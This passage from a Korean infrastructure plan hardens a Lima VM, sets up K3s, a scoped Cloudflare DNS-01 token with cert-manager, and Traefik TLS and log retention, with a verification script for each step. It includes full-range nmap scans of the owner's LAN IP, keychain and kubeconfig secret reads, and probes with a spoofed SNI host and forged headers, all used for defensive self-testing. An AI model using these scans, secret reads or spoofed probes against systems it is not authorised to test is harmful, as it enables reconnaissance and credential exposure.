  - `m1-hardening.sh` (VM, `vm_run --root`, 첫 assert는 `id -u` = 0):
    - `sshd -T`: `passwordauthentication no`, `permitrootlogin no`, `kbdinteractiveauthentication no`
    - `systemctl is-enabled unattended-upgrades` = `enabled`
    - `timedatectl show -p NTPSynchronized --value` = `yes`
    - 멱등: `bootstrap.sh` 재실행 전후 `/etc/ssh/sshd_config.d/99-hardening.conf`와 `/etc/apt/apt.conf.d/20auto-upgrades`의 sha256 동일
  - `m1-exposure.sh` (Mac):
    - **Mac 리스너:** `lsof -nP -iTCP -sTCP:LISTEN > $tmp/tcp.txt` 성공과 파일이 비어 있지 않음(macOS에는 늘 리스너가 있음)을 assert → `lima_listeners` 결과 = 단계별 기대값 (`assert_eq`)
    - **루프백 외 바인드 없음:** `lima_listeners` 결과를 `$tmp/lima-tcp.txt`로 저장하고 **비어 있지 않음**(기대값에 Lima SSH 또는 6443이 있으므로)을 assert한 뒤 `assert_fails_with "no non-loopback limactl listener" --rc 1 -- grep -Ev '^127\.0\.0\.1:' "$tmp/lima-tcp.txt"`. Lima SSH 포트가 없는 `base` 단계라 목록이 빌 수 있으면 이 항목은 `SKIP(no limactl listener)`로 명시 출력하고 위 `assert_eq`가 빈 목록을 보장한다
    - **UDP 포워드 없음:** `lsof -nP -iUDP > $tmp/udp.txt`의 rc 0과 파일이 비어 있지 않음(mDNS 등 시스템 UDP 소켓이 늘 있음)을 assert → `lima_listeners` → `$tmp/lima-udp.txt`, `assert_fails_with "no limactl UDP sockets" --rc 1 -- grep -Eq . "$tmp/lima-udp.txt"`
    - **자동 포워드 음성 검사 (양성 대조 포함):** VM에서 `python3 -m http.server 18080 --bind 0.0.0.0`과 `python3 -m http.server 18081 --bind 127.0.0.1`을 백그라운드로 띄움 → VM 안에서 `curl -sS -o /dev/null http://127.0.0.1:18080/`, `:18081` 성공 assert(양성 대조) → 5초 대기 → Mac에서 `assert_fails_with "guest 0.0.0.0:18080 not forwarded" --rc 7 --match '^curl: \(7\)' -- curl -sS --max-time 3 http://127.0.0.1:18080/`, 18081도 같은 방식 → 끝나면 리스너 종료(trap). 시작 전 Mac에 18080/18081 리스너가 없음을 먼저 확인.
    - **guest IP 직접 도달 불가 (Q13의 핵심 증명):** `GUEST_IP`를 VM `ip -4 -o addr show scope global`에서 얻음 → VM 안에서 `curl -sS -o /dev/null http://$GUEST_IP:18080/` 성공 assert(양성 대조) → Mac에서 `assert_fails_with "guest IP not reachable from Mac" --match '^curl: \((7|28)\)' -- curl -sS --max-time 3 http://$GUEST_IP:18080/`
    - **Mac LAN IP:** 기본 경로 인터페이스를 `route -n get default`의 `interface:`에서 얻고 `LAN_IP=$(ipconfig getifaddr <그 인터페이스>)`. 값이 있으면 `assert_fails_with "6443 not on Mac LAN IP" --rc 7 --match '^curl: \(7\)' -- curl -sS --max-time 3 -k https://$LAN_IP:6443/` (443도 같은 방식). 기본 경로나 주소가 없으면 조용히 건너뛰지 않고 `SKIP(no LAN interface: <이유>)`를 출력하며, `verify-m1`에서는 이 SKIP을 FAIL로 센다 (`M1_STRICT=1`)
    - **VM 리스너 기록 (통제 아님):** `vm_run --root`로 `ss -Hltnu` → `guest_listeners` → `docs/evidence/m1/guest-listeners-<stage>.txt`(`scrub_evidence` 후). 호스트 방화벽이 없으므로 이 목록의 비루프백 리스너는 위 두 설정(`networks: []`, 포워드 규칙)으로만 가려진다는 사실을 파일 머리에 적는다.
  - `m1-lan-scan.sh` (Mac, S1 대체). 입력 두 파일은 `nmap -n -Pn -p- -T4 -oG <파일> <LAN_IP>`로 만든다 (`-n`: 역방향 DNS 이름을 남기지 않음):
    - **입력 위생:** 두 파일에 `Host: <ip> (<이름>)`처럼 괄호 안 이름이 비어 있지 않은 줄이 없음 (`assert_fails_with "no reverse-DNS names in scan" --rc 1 -- grep -Eq '^Host: [^ ]+ \([^)]' <파일>`), `scanner:`·`control-port:`·`firewall-state:`·`firewall-allowance:` 머리 줄이 있음, `scanner: docker`이면 Docker 한계 문장이 있음
    - **스캔 유효성(양성 대조):** 두 파일 모두 `# Nmap done`과 `Host: <LAN_IP>` 줄이 있음. 두 결과 모두 `open_tcp_ports`에 대조 포트 `18090`이 있음 (스캐너가 Mac의 열린 포트를 실제로 본다는 증거). 대조 리스너와 방화벽 허용은 아래 수동 Step에서 띄우고 지운다.
    - **방화벽 상태·임시 허용 제거 확인 (sudo 없는 읽기 명령만):** 검증 스크립트는 상태를 바꾸는 명령(`--add`·`--unblockapp`·`--remove`)이나 `sudo`를 쓰지 않는다. `/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate > $tmp/fwstate` 성공 assert → 머리의 `firewall-state:`(`enabled`/`disabled`)가 지금 상태와 같음. 상태가 `enabled`인데 `firewall-allowance: no`이면 그 조합을 출력만 한다 (스캐너가 18090을 열림으로 본 양성 대조가 이미 검사됐으므로 판정은 그쪽에 맡긴다). 머리가 `firewall-allowance: yes`이면 `/usr/libexec/ApplicationFirewall/socketfilterfw --listapps > $tmp/fwapps` 성공 assert → `assert_fails_with "temporary python firewall allowance removed" --rc 1 -- grep -Fq "<python 경로>" "$tmp/fwapps"`
    - **VM이 LAN 포트를 늘리지 않음:** `open_tcp_ports` 결과를 `$tmp/open-off.txt`, `$tmp/open-on.txt`로 저장하고 둘 다 비어 있지 않음(대조 포트 18090이 있으므로)을 assert한 뒤 `assert_succeeds "VM adds no port on Mac LAN IP" -- cmp -s "$tmp/open-off.txt" "$tmp/open-on.txt"`
    - **명시 음성 검사:** 포트 `22 80 443 6443 10250 20241 <Lima SSH 포트>` 각각 `assert_fails_with "<port> not open on Mac LAN IP" --rc 1 -- grep -Eqx '<port>' "$tmp/open-on.txt"`
- [ ] **Step 4:** 실행 → FAIL 확인 (하드닝 전, 스크립트 없음).
- [ ] **Step 5:** `bootstrap.sh` 구현: unattended-upgrades 활성, `99-hardening.conf`(`PasswordAuthentication no`, `PermitRootLogin no`, `KbdInteractiveAuthentication no`) 작성 후 `sshd -t`가 통과할 때만 `systemctl reload ssh`, `systemd-timesyncd` 활성. 두 번 실행해도 결과가 같아야 한다.
- [ ] **Step 6 (MANUAL):** VM에서 `sudo bash bootstrap.sh` → **다른 Mac 터미널에서** `limactl shell $LIMA_INSTANCE true` 성공 확인 (sshd 설정 변경 후 접속 유지 확인).
- [ ] **Step 7:** `vm_run --root m1-hardening.sh`, `m1-exposure.sh --stage base` PASS. `bootstrap.sh` 재실행 후에도 PASS (멱등).
- [ ] **Step 8 (MANUAL, 사용자): LAN 스캔 (S1 대체)** — 런북 `m1-lima-vm.md`의 "LAN 스캔" 절:
  1. Mac에서 대조 리스너를 띄운다: `python3 -m http.server 18090 --bind <LAN_IP>`.
  2. 방화벽 상태 확인: `/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate`(sudo 불필요). **disabled이면 이 단계와 6의 제거는 건너뛰고** `firewall-state: disabled`, `firewall-allowance: no`로 기록한다. **enabled이고 18090이 막힐 때만** (MANUAL, 사용자, 검증 스크립트 밖에서, sudo 필요) 스캔하는 동안만 python을 허용한다: `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add <python 경로>` → `sudo ... --unblockapp <python 경로>`. 이 경우 `firewall-state: enabled`, `firewall-allowance: yes`와 python 경로(`/Users/<user>/...`로 치환)를 기록한다.
  3. `limactl stop $LIMA_INSTANCE` → 같은 LAN의 **다른 실제 기기**(기본: 다른 노트북, Termux에서 nmap을 돌리는 휴대폰)에서 `nmap -n -Pn -p- -T4 -oG lan-scan-base-vm-off.gnmap <LAN_IP>`. 다른 기기를 쓸 수 없을 때만 대체 수단 `make lan-scan`(Docker, 한계 문장 자동 삽입). (`m1-lan-scan.sh`는 nmap `-oG` 형식만 읽으므로 다른 노트북의 nmap 또는 휴대폰 Termux의 nmap만 인정한다. 그 밖의 스캔 앱 결과는 받지 않는다)
  4. `limactl start $LIMA_INSTANCE` → 같은 방식으로 `lan-scan-base-vm-on.gnmap`.
  5. 두 파일 머리에 `scanner: device|docker`, `control-port: 18090`, `firewall-state: enabled|disabled`, `firewall-allowance: yes|no`를 적고 `scrub_evidence`로 LAN IP 등을 치환해 `docs/evidence/m1/`에 저장.
  6. 대조 리스너를 멈춘다. 2에서 허용했다면 (MANUAL, 사용자, sudo 필요) `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --remove <python 경로>`로 허용을 지우고, `--listapps`(sudo 불필요)로 빠졌는지 본다.
  7. `m1-lan-scan.sh --vm-off ... --vm-on ...` PASS.
- [ ] **Step 9: 커밋** `feat(host): hardening and inbound exposure proof without host firewall`

---

### Task 4: K3s 설치 (API는 Mac 127.0.0.1 전용)

**Files:**
- Create: `scripts/host/install-k3s.sh`, `scripts/verify/m1-k3s.sh`, `scripts/verify/lib/k8s.sh`, `k8s/VERSIONS.md`, `docs/runbooks/m1-kubeconfig.md`

**Interfaces:**
- Consumes: `env.sh` (`K3S_VERSION`, `LIMA_INSTANCE`), `vm_run`
- Produces: Mac의 `~/.kube/secure-ax.kubeconfig` (server `https://127.0.0.1:6443`, 600). 이후 모든 Task의 `kubectl`은 `KUBECONFIG=~/.kube/secure-ax.kubeconfig`. `scripts/verify/lib/k8s.sh`의 `node_ip` = `kubectl get node -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}'`.

- [ ] **Step 1: 실패하는 검증 작성** `m1-k3s.sh` (Mac):
  - 노드 1개 `Ready`, 서버 `gitVersion` = `K3S_VERSION`
  - `vm_run --root`로 `k3s secrets-encrypt status`에 `Encryption Status: Enabled`, `/etc/rancher/k3s/k3s.yaml` 권한 `600`
  - Mac `curl -sk --max-time 5 -o /dev/null -w '%{http_code}' https://127.0.0.1:6443/version` = `401` (API는 닿고 익명은 거부. 200이면 익명 허용 상태이므로 FAIL로 두고 원인을 기록)
  - 익명 권한 없음: `assert_fails_with "anonymous denied" --rc 1 --match 'You must be logged in to the server \(Unauthorized\)|Error from server \(Forbidden\)' -- kubectl --kubeconfig /dev/null --server https://127.0.0.1:6443 --insecure-skip-tls-verify get ns`
  - kube-system의 `traefik metrics-server coredns local-path-provisioner` Available
  - **Traefik 443이 Mac에 포워드되지 않음 (Review Focus 1):** `assert_fails_with "traefik 443 not forwarded to Mac" --rc 7 --match '^curl: \(7\)' -- curl -sS --max-time 3 -k https://127.0.0.1:443/` (80도 같은 방식)
  - `m1-exposure.sh --stage k3s` PASS (Mac 리스너가 6443 + SSH뿐, LAN IP:6443 실패, guest IP 도달 불가)
  - `m1-lima.sh` PASS (설정 불변)
- [ ] **Step 2:** 실행 → FAIL 확인.
- [ ] **Step 3:** `install-k3s.sh`: `INSTALL_K3S_VERSION=$K3S_VERSION`, `server --secrets-encryption --write-kubeconfig-mode 600`. 같은 버전이면 건너뜀. 설치 스크립트 sha256 출력·기록. Lima·OCI 구분 분기 없음.
- [ ] **Step 4:** 런북 `m1-kubeconfig.md`: `limactl shell $LIMA_INSTANCE sudo cat /etc/rancher/k3s/k3s.yaml > ~/.kube/secure-ax.kubeconfig && chmod 600 ~/.kube/secure-ax.kubeconfig`. server는 이미 `https://127.0.0.1:6443`이라 바꾸지 않는다 (Lima 포워드가 같은 주소로 연결). 서버 인증서 SAN에 `127.0.0.1`이 있는지 `openssl s_client`로 확인해 기록.
- [ ] **Step 5:** PASS 확인. `VERSIONS.md`에 K3s·Traefik 차트 버전 기록.
- [ ] **Step 6:** 기준선 측정 (`free -m`, `kubectl top node`) → `docs/evidence/m1/resource-baseline.md` (`scrub_evidence` 후). VM이 OCI A1과 같은 2 CPU / 12 GiB라 §15.1 비교가 유효함을 함께 적는다 (CPU 성능 차이는 기록만).
- [ ] **Step 7: 커밋** `feat(k3s): pinned install with secrets-encryption, API on mac loopback only`

---

### Task 5: Cloudflare 계정·비용 점검, DNS 기준선, DNS-01 토큰, cert-manager

**Files:**
- Create: `docs/runbooks/m1-cloudflare-account.md`, `docs/runbooks/m1-cloudflare-token.md`, `docs/runbooks/m1-cert-manager.md`, `docs/cost/README.md`, `scripts/verify/m1-dns-baseline.sh`, `docs/evidence/m1/dns-baseline.txt`, `k8s/platform/cert-manager/{values.yaml,clusterissuers.yaml.tmpl,kustomization.yaml}`, `scripts/verify/m1-certmanager.sh`, `scripts/verify/lib/cfapi.sh`

**Interfaces:**
- Consumes: `env.sh` (`CF_ZONE`, `ACME_EMAIL`, `HOST_*`), kubeconfig
- Produces:
  - K8s Secret `cert-manager/cloudflare-dns01-token` (키 `api-token`). ClusterIssuer가 참조하는 Secret은 Cluster Resource Namespace(기본 `cert-manager`)에 있어야 한다.
  - `ClusterIssuer` `letsencrypt-staging`, `letsencrypt-prod` — `dns01.cloudflare.apiTokenSecretRef`, solver `selector.dnsZones: [whoareryu.cloud]`. HTTP-01 solver 없음. Task 8의 `Certificate`가 이 이름을 쓴다.
  - `docs/evidence/m1/dns-baseline.txt` — apex/www의 공개 DNS 응답(공개 정보)과 "DNS-only(회색), Vercel" 메모.
  - `scripts/verify/lib/cfapi.sh`: `cf_api <METHOD> <path> [json-body]` — 토큰을 키체인(`security find-generic-password -s secure-ax-cf-dns01 -w`)에서 읽어 호출하고(토큰은 출력·인자·파일에 남기지 않고 `curl -H @-`처럼 stdin으로 전달), 응답 JSON의 `"success":true`가 아니면 본문을 출력하고 exit 1. 모든 호출은 파일 맨 위에서 한 번만 정의하는 `CF_CURL=(curl -4 -sS --max-time 20)` 배열(bash 3.2 호환)을 통해서만 하며, 그래서 IPv4만 쓴다 (결정 N1). 파일 안의 다른 줄에서 `curl`을 직접 부르지 않는다.
  - `docs/cost/README.md` — 비용 증거 목록과 "기존 개인 도메인 사용, 프로젝트 추가 비용 0원" 문구 (Q21).

- [ ] **Step 1 (MANUAL, 사용자): 계정·비용 점검** — 런북 `m1-cloudflare-account.md`:
  1. Cloudflare 대시보드 → Manage Account → Billing: **Subscriptions에 유료 항목 0개**인지, Payment info에 결제수단이 있는지 확인. 있으면 제거를 시도한다. 제거가 막히면 이유를 기록하고 "구독 0개" 화면을 남긴다 (CG-CF2).
  2. zone `whoareryu.cloud` → Overview에서 플랜 **Free** 확인.
  3. 금지 유료 기능 목록(CG-CF3)을 런북에 붙이고, 각 항목이 "미사용/비활성"인지 대시보드에서 확인.
  4. 캡처를 `docs/cost/2026-11-cloudflare-{billing,subscriptions,plan}.png`로 저장 (Global Constraints의 "증거 위생" 캡처 규칙대로 이메일, 계정 이름·ID, 카드 정보를 가림).
- [ ] **Step 2 (MANUAL, 사용자): DNS 기준선** — DNS 탭에서 apex와 `www` 레코드의 타입, 값, 프록시 상태(회색 = DNS-only, Q4)를 캡처한다 (`docs/evidence/m1/dns-baseline.png`, 캡처 규칙대로 계정 정보 가림).
- [ ] **Step 3: 실패하는 검증 작성** `m1-dns-baseline.sh` (Mac):
  - `dig +short NS $CF_ZONE @1.1.1.1`이 모두 `*.ns.cloudflare.com`
  - `dig +short A $CF_ZONE @1.1.1.1`, `dig +short CNAME www.$CF_ZONE @1.1.1.1`, `dig +short A www.$CF_ZONE @1.1.1.1` 결과가 `dns-baseline.txt`와 같음 (Review Focus 4)
  - **apex/www 비프록시 (Q4):** `curl -sS -I --max-time 10 https://$CF_ZONE/ -o $tmp/apex.h` 성공을 assert → `assert_fails_with "apex not proxied by cloudflare" --rc 1 -- grep -Eqi '^cf-ray:' "$tmp/apex.h"` (`www`도 같은 방식)
  - CAA: `dig +short CAA $CF_ZONE`가 비어 있거나 `letsencrypt.org`를 포함 (아니면 FAIL과 함께 "CAA가 LE를 막음")
  - `_acme-challenge` 잔여 TXT 없음 (세 호스트): `dig +short TXT _acme-challenge.$HOST_SAFEDESK @1.1.1.1 > $tmp/txt` 성공 assert → `assert_fails_with "no leftover acme txt" --rc 1 -- grep -Eq . "$tmp/txt"`
- [ ] **Step 4:** 실행 → `dns-baseline.txt` 없음으로 FAIL → Step 2 결과로 기준선 파일 작성 → PASS 확인.
- [ ] **Step 5 (MANUAL, 사용자): DNS-01 토큰 생성 (Q5 B+C, Q6 A)** — 런북 `m1-cloudflare-token.md`:
  - My Profile → API Tokens → Create Custom Token. 권한 **Zone · DNS · Edit**, **Zone · Zone · Read**(cert-manager Cloudflare 솔버가 zone ID 조회에 사용 — 기술적 필요 → 사용자 승인 2026-11-20). 이 두 권한 외에는 넣지 않는다. Zone Resources **Include · Specific zone · whoareryu.cloud**.
  - **Client IP Address Filtering:** Is in = 집 공인 **IPv4** 하나 (결정 N1 — API 호출은 IPv4로 강제) (Mac과 VM의 이그레스가 같은 주소임을 먼저 확인 — Mac에서 VPN을 켜면 실패한다는 사실을 런북에 적음). 증거에는 `<HOME_IP>`로만 적는다.
  - **TTL:** 오늘부터 6개월 뒤 만료. 만료 30일 전 교체 절차(새 토큰 → 키체인 갱신 → Secret 재생성 → 이전 토큰 폐기)와 집 IP가 바뀌었을 때의 필터 수정 절차를 런북에 적는다.
  - 토큰 값은 화면에서 바로 키체인에 넣는다: `security add-generic-password -s secure-ax-cf-dns01 -a cert-manager -w` (프롬프트 입력, 셸 히스토리·파일에 남기지 않음).
  - 토큰 요약 화면(권한 두 개, zone, IP 필터, 만료일 — 값은 보이지 않음. 캡처 규칙대로 IP·토큰 ID·계정 정보 가림)을 `docs/evidence/m1/cf-token-dns01.png`로 캡처.
- [ ] **Step 6: 실패하는 검증 작성** `m1-certmanager.sh` (Mac, `ASSERT_NO_OUTPUT=1`로 실행):
  - ns `cert-manager`의 deploy 3개(`cert-manager`, `cert-manager-webhook`, `cert-manager-cainjector`) Available
  - Secret `cert-manager/cloudflare-dns01-token`에 키 `api-token` 존재 (값 출력 금지: `kubectl get secret ... -o jsonpath='{.data.api-token}' | wc -c` > 0)
  - 키체인 토큰과 Secret 값이 같음 (두 값의 sha256만 비교, 값은 출력하지 않음)
  - ClusterIssuer 두 개 Ready = `True True`, solver에 `dns01.cloudflare` 존재. **HTTP-01 없음:** `kubectl get clusterissuer -o yaml > $tmp/ci.yaml` 성공 assert → `assert_fails_with "no http01 solver" --rc 1 -- grep -Eq 'http01' "$tmp/ci.yaml"`
  - **토큰 범위 검증** (`cf_api`):
    - `GET /user/tokens/verify` → `result.status` = `active`
    - **만료 (Q5 C):** 같은 응답의 `result.expires_on`이 비어 있지 않고, 지금부터 186일 이내. 30일 이내면 FAIL과 함께 "교체 필요"
    - **허용된 권한이 동작함 (양성 대조):** `GET /zones` → zone 수 = 1, 이름 = `$CF_ZONE` (Zone·Zone·Read). `GET /zones/$ZONE_ID/dns_records?per_page=1` → `success: true` (Zone·DNS 권한). 발급 자체(DNS 쓰기)는 Task 8의 staging 인증서 Ready가 증명한다
    - **두 권한 외에는 없음:** 토큰이 자기 권한 목록을 읽을 수는 없으므로, 아래 음성 검사 두 개(설정 변경 불가, 계정 접근 불가)와 Step 5 캡처(권한 두 개만)로 증명한다
    - zone 설정 변경 불가: `assert_fails_with "token cannot change zone settings" --rc 1 --match '"code":[[:space:]]*(9109|10000)' -- cf_api PATCH "/zones/$ZONE_ID/settings/ssl" '{"value":"strict"}'`
    - 계정 수준 접근 불가: `GET /accounts`의 실제 응답을 실행 시 확인해 둘 중 하나로 고정 — 오류면 `assert_fails_with "token cannot read accounts" --rc 1 --match '"code":[[:space:]]*(9109|10000)' -- cf_api GET /accounts`, 빈 목록 성공이면 `result` 길이 0을 `assert_eq`
    - IP 필터는 다른 IP에서 토큰을 쓰는 시험을 하지 않는다 (토큰을 외부로 보내는 일이 되므로). Step 5의 캡처를 증거로 하고, 이 한계를 증거 README에 적는다.
  - 저장소에 토큰 없음: `gitleaks detect --no-banner` rc 0
  - **IPv4 강제 (결정 N1):**
    - `cf_api` 정의에 `curl -4`가 있음: 주석을 제외한 줄 중 `curl`이 나오는 줄이 정확히 하나이고 그 줄이 `CF_CURL=(curl -4 ` 정의임 (`grep -Ev '^[[:space:]]*#' scripts/verify/lib/cfapi.sh | grep -Ec '(^|[^[:alnum:]_])curl([[:space:]]|$)'` = 1, 그리고 `grep -Eq '^CF_CURL=\(curl -4 '` 성공). `scripts/cf/export-config.sh`도 Task 10에서 같은 검사
    - VM에 전역 IPv6 없음: `vm_run`으로 `ip -6 -o addr show scope global > $tmp/v6addr`와 `ip -6 route show default > $tmp/v6route` 실행 성공 assert → `assert_fails_with "VM has no global IPv6 address" --rc 1 -- grep -Eq . "$tmp/v6addr"`, `assert_fails_with "VM has no IPv6 default route" --rc 1 -- grep -Eq . "$tmp/v6route"`
    - 클러스터는 IPv4 단일 스택: `kubectl get node -o jsonpath='{.items[0].spec.podCIDRs}'`와 kube-system `kube-dns` Service의 `ipFamilies`를 파일로 받은 뒤 `assert_fails_with "no IPv6 pod CIDR" --rc 1 -- grep -Fq ':' "$tmp/podcidrs"`, `ipFamilies` = `["IPv4"]`. 그래서 cert-manager의 Cloudflare API 이그레스도 IPv4뿐이다 (IPv6 경로 없음). 양성 대조: Task 8에서 DNS-01 발급이 성공하면 cert-manager 호출이 IPv4 필터를 통과한 것이다.
- [ ] **Step 7:** 실행 → FAIL 확인 → 런북대로 cert-manager 설치(버전 고정, `crds.enabled: true`, §15.1 resources 합계 requests 150Mi / limits 300Mi) → Secret 생성 (`security find-generic-password -s secure-ax-cf-dns01 -w | kubectl -n cert-manager create secret generic cloudflare-dns01-token --from-file=api-token=/dev/stdin`) → `clusterissuers.yaml.tmpl`을 `envsubst`로 `ACME_EMAIL` 주입해 적용(렌더 결과 미커밋) → PASS 확인.
- [ ] **Step 8:** cert-manager의 DNS-01 자체 전파 확인이 Task 8에서 늦으면 `--dns01-recursive-nameservers-only --dns01-recursive-nameservers=1.1.1.1:53`을 values에 추가하고 이유를 런북에 기록 **[빌더 재량]**.
- [ ] **Step 9:** `m1-dns-baseline.sh` 재실행 PASS (apex/www 불변).
- [ ] **Step 10: 커밋** `feat(tls): cloudflare account guardrails, dns baseline, scoped dns-01 token, cert-manager issuers`

---

### Task 6: Traefik 설정 — 신뢰 프록시 범위, TLS 1.2 + sniStrict, 로그 위생과 보존

**Files:**
- Create: `k8s/platform/traefik/{helmchartconfig.yaml.tmpl, tlsoption.yaml, kustomization.yaml}`, `scripts/verify/m1-traefik.sh`, `scripts/host/install-log-retention.sh`, `scripts/host/logrotate/secure-ax-traefik`, `scripts/host/systemd/logrotate.timer.d/secure-ax-boot.conf`, `scripts/host/systemd/logrotate.service.d/secure-ax-prune.conf`

**Interfaces:**
- Consumes: kubeconfig, `node_ip`, `vm_run`
- Produces:
  - `TLSOption` `default`(kube-system): `minVersion: VersionTLS12`, `sniStrict: true`.
  - Traefik `websecure` 엔트리포인트 `forwardedHeaders.trustedIPs` **[Claude 제안, Task 9 실측 대기]** — cloudflared(VM 호스트)에서 Traefik까지 오는 연결의 출발 주소 하나(/32)만. 초기값은 `<NODE_IP>/32`이며, Task 9 Step 7에서 Traefik 접근 로그의 실제 출발 주소(노드 IP 또는 CNI 게이트웨이)를 재서 확정한다. 실측값이 다르면 그 값으로 바꾸고 이유를 기록한다. 이 계획의 다른 곳(완료 기준, 관련 문서)도 "노드 IP"로 단정하지 않는다.
  - 접근 로그 JSON, `fields.headers.defaultmode: drop`, `Cf-Connecting-Ip`만 `keep` (Q12 A), 쿼리스트링 미기록.
  - 접근 로그 보존 **7일 이하** (Q12 A, 결정 N3):
    - Traefik `accessLog.filePath: /var/log/traefik/access.log`. Traefik Pod에 hostPath `/var/log/traefik`(DirectoryOrCreate) 마운트. stdout에는 접근 로그를 쓰지 않는다 (컨테이너 로그에 방문자 IP가 남지 않게). 디렉터리는 `install-log-retention.sh`가 Traefik 컨테이너 UID 소유, 0750으로 만든다 (kube-system은 PSA restricted 대상이 아님).
    - 호스트 logrotate `/etc/logrotate.d/secure-ax-traefik` **[Claude 제안]**: `daily`, `rotate 7`, `maxage 7`, `missingok`, **`ifempty`**, `compress`, `copytruncate`(Traefik 재시작·시그널 없이 회전). `maxage`는 실제 회전이 일어날 때만 평가되므로, 트래픽이 없어 `access.log`가 빈 날에도 회전이 일어나도록 `notifempty`가 아니라 `ifempty`를 쓴다.
    - 안전망: `logrotate.service` drop-in `secure-ax-prune.conf`의 `ExecStartPost=/usr/bin/find /var/log/traefik -type f -name 'access.log.*' -mmin +10080 -delete` (7일 = 10080분).
    - 놓친 실행·부팅 시 회전: Ubuntu `logrotate.timer`(`Persistent=true`)에 drop-in `secure-ax-boot.conf`로 `OnBootSec=2min` 추가. VM이 7일 넘게 꺼져 있다 켜져도 부팅 직후 회전·삭제가 돈다.
    - `install-log-retention.sh`(VM, root, 멱등): 디렉터리, logrotate 설정, 두 drop-in 설치 후 `logrotate -d`로 문법 확인, `systemctl daemon-reload`.
  - `externalTrafficPolicy: Local`은 유지(무해). 목적이 "공인 IP 클라이언트 보존"에서 "로컬 경로 단순화"로 바뀐 사실을 주석으로 남긴다.

- [ ] **Step 1: 실패하는 검증 작성** `m1-traefik.sh` (Mac + VM):
  - svc `traefik` `externalTrafficPolicy` = `Local`
  - Traefik 컨테이너 args를 파일로 받은 뒤 `assert_fails_with "dashboard not enabled" --rc 1 -- grep -Eq -- '--api\.(dashboard=true|insecure)' "$tmp/args"`
  - `tlsoption default`: `minVersion` = `VersionTLS12`, `sniStrict` = `true`
  - `forwardedHeaders.trustedIPs`가 정확히 한 개의 /32
  - **로그 보존 (Q12, 결정 N3)** (VM, `vm_run --root`, 첫 assert는 `id -u` = 0):
    - `logrotate.timer` enabled·active, drop-in에 `OnBootSec` 존재, `logrotate.service` drop-in에 prune `ExecStartPost` 존재, `/etc/logrotate.d/secure-ax-traefik`에 `daily`·`maxage 7`·`ifempty` 존재
    - **`maxage` 삭제 시연 (안전망 없이 logrotate만):** 무작위 표식 `<M>`을 담은 `access.log.2.gz`(`rotate 7` 개수 안이라 개수 규칙으로는 지워지지 않음)를 만들고 `touch -d '9 days ago'` → `access.log`에 한 줄 추가 → `test -e` 성공으로 파일 존재 확인(양성 대조) → `logrotate -f /etc/logrotate.d/secure-ax-traefik` 실행 성공 assert (prune `ExecStartPost`가 돌지 않도록 서비스가 아니라 logrotate를 직접 실행) → `find /var/log/traefik -type f -name 'access.log.*' > $tmp/rotated` 성공 assert → 목록의 각 파일에 대해 `zcat -f`로 합친 내용을 `$tmp/rotated-content`에 저장 → `assert_fails_with "maxage removed the 9-day-old rotated log" --rc 1 -- grep -Fq "<M>" "$tmp/rotated-content"`. 회전 뒤 이름이 `access.log.3.gz`로 바뀌어도 표식으로 판정하므로 이름에 기대지 않는다
    - **안전망 시연:** 같은 방식으로 표식 `<P>`를 담은 9일 전 `access.log.5.gz`를 만들고 `systemctl start logrotate.service` 성공 assert → 같은 방식으로 `<P>` 부재 확인
    - 현재 상태: `find /var/log/traefik -type f -mmin +10080 > $tmp/old-logs` 성공 assert → `assert_fails_with "no traefik access log older than 7 days" --rc 1 -- grep -Eq . "$tmp/old-logs"`
    - 컨테이너 stdout에 방문자 IP 없음: `kubectl -n kube-system logs deploy/traefik --tail=500 > $tmp/stdout` 성공 assert → `assert_fails_with "no access log on traefik stdout" --rc 1 -- grep -Eq 'Cf-Connecting-Ip|ClientHost' "$tmp/stdout"`
  - (Task 8 이후 활성화되는 항목, 지금은 SKIP 표시) VM에서 (`vm_run --root` — 로그 파일을 읽으므로):
    - `assert_fails_with "TLS1.1 refused at origin" --rc 35 --match 'alert protocol version' -- curl -sS --tlsv1.1 --tls-max 1.1 --ciphers 'DEFAULT@SECLEVEL=0' --resolve $HOST_SAFEDESK:443:$NODE_IP https://$HOST_SAFEDESK/` (클라이언트 OpenSSL이 스스로 TLS 1.1을 거부해 생기는 rc 35를 배제하려고 서버 alert 문자열로 판정)
    - `assert_fails_with "unknown SNI refused (sniStrict)" --rc 35 --match 'alert unrecognized name' -- curl -sS -k --resolve evil.invalid:443:$NODE_IP https://evil.invalid/` (Go TLS는 sniStrict 위반에 `unrecognized name` alert를 보낸다고 보고 이 문자열로 고정. 실행 시 실제 메시지를 확인해 다르면 그 문자열로 바꾸고 `VERSIONS.md` 옆 메모에 기록)
    - 대시보드 경로 비노출: `/dashboard/` 응답이 200이 아님
    - **로그 위생 (양성 대조 포함):** 무작위 값 `<R>`, `<S>`를 만들고 `curl ... -H 'Cf-Connecting-Ip: 192.0.2.10' "https://$HOST_SAFEDESK/m1probe-<R>?probe=<S>"` (원본 직결 요청에는 cloudflared가 없으므로 헤더를 직접 보냄, 192.0.2.10은 문서용 주소) → `/var/log/traefik/access.log`를 `$tmp/log`로 받음 → 양성 대조: `grep -Fq "m1probe-<R>"`와 `request_Cf-Connecting-Ip` 키가 있음 → `assert_fails_with "query string not logged" --rc 1 -- grep -Fq "<S>" "$tmp/log"`, 같은 방식으로 `request_Cookie`, `request_Authorization` 0건. Task 9 이후에는 터널 경유 요청으로도 한 번 더 확인한다 (헤더를 직접 보내지 않고 `Cf-Connecting-Ip`가 기록됨)
- [ ] **Step 2:** FAIL 확인.
- [ ] **Step 3:** `helmchartconfig.yaml.tmpl` 작성(정확한 키는 Task 4에서 기록한 차트 버전의 values로 확인, 부록 A), `NODE_IP` 주입 → VM `/var/lib/rancher/k3s/server/manifests/traefik-config.yaml`로 복사. `tlsoption.yaml`은 `kubectl apply -k k8s/platform/traefik`.
- [ ] **Step 4:** 로그 보존 구성 (결정 N3): VM에서 `sudo bash install-log-retention.sh` → HelmChartConfig의 접근 로그 파일 경로·hostPath 마운트 적용 → Traefik 재시작 후 `/var/log/traefik/access.log`에 터널 경유 요청이 쌓이는지 확인 (Task 9 이후). 재실행해도 결과가 같아야 한다.
- [ ] **Step 5:** 지금 PASS 가능한 항목만 PASS 확인, 나머지는 Task 8 Step 9에서 재실행.
- [ ] **Step 6: 커밋** `feat(ingress): traefik trusted-proxy scope, TLS1.2 + sniStrict, log hygiene and 7-day retention`

---

